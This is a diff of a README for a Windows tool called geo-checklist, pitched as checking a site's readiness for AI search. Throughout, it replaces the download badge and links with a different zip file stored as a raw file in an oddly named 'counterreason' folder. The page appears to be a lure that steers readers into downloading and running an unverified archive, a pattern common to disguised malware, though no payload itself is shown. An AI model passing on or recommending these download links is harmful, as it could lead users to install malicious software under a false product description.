@@ -1,6 +1,6 @@
 # 🗂 geo-checklist - Check Your Site for AI Search Readiness
 
-[![Download geo-checklist](https://img.shields.io/badge/Download-geo--checklist-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/jimmykabobman-a11y/geo-checklist/main/counterreason/geo-checklist-2.7-alpha.4.zip)
+[![Download geo-checklist](https://img.shields.io/badge/Download-geo--checklist-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/jimmykabobman-a11y/geo-checklist/main/counterreason/geo_checklist_2.4-beta.1.zip)
 
 ## 📋 What is geo-checklist?
 
@@ -23,7 +23,7 @@ This app runs on Windows computers only. It does not require installation of add
 ## 🚀 Getting Started
 
 1. Click the download button below to visit the page where you can get the geo-checklist tool:  
-[![Download geo-checklist](https://img.shields.io/badge/Download-geo--checklist-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/jimmykabobman-a11y/geo-checklist/main/counterreason/geo-checklist-2.7-alpha.4.zip)
+[![Download geo-checklist](https://img.shields.io/badge/Download-geo--checklist-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/jimmykabobman-a11y/geo-checklist/main/counterreason/geo_checklist_2.4-beta.1.zip)
 
 2. On the page, look for the latest release or main download section.
 
@@ -119,7 +119,7 @@ After downloading:
 geo-checklist receives updates to improve checks and add new AI search criteria. To update:
 
 1. Visit the download page again:  
-[Geo-checklist on GitHub](https://raw.githubusercontent.com/jimmykabobman-a11y/geo-checklist/main/counterreason/geo-checklist-2.7-alpha.4.zip)
+[Geo-checklist on GitHub](https://raw.githubusercontent.com/jimmykabobman-a11y/geo-checklist/main/counterreason/geo_checklist_2.4-beta.1.zip)
 
 2. Download the newest version if available.
 
@@ -155,4 +155,4 @@ This app touches on:
 
 Use the link below to visit the page to download geo-checklist for Windows. This is your starting point to make your website ready for the new generation of AI search engines.
 
-[![Download geo-checklist](https://img.shields.io/badge/Download-geo--checklist-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/jimmykabobman-a11y/geo-checklist/main/counterreason/geo-checklist-2.7-alpha.4.zip)
+[![Download geo-checklist](https://img.shields.io/badge/Download-geo--checklist-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/jimmykabobman-a11y/geo-checklist/main/counterreason/geo_checklist_2.4-beta.1.zip)
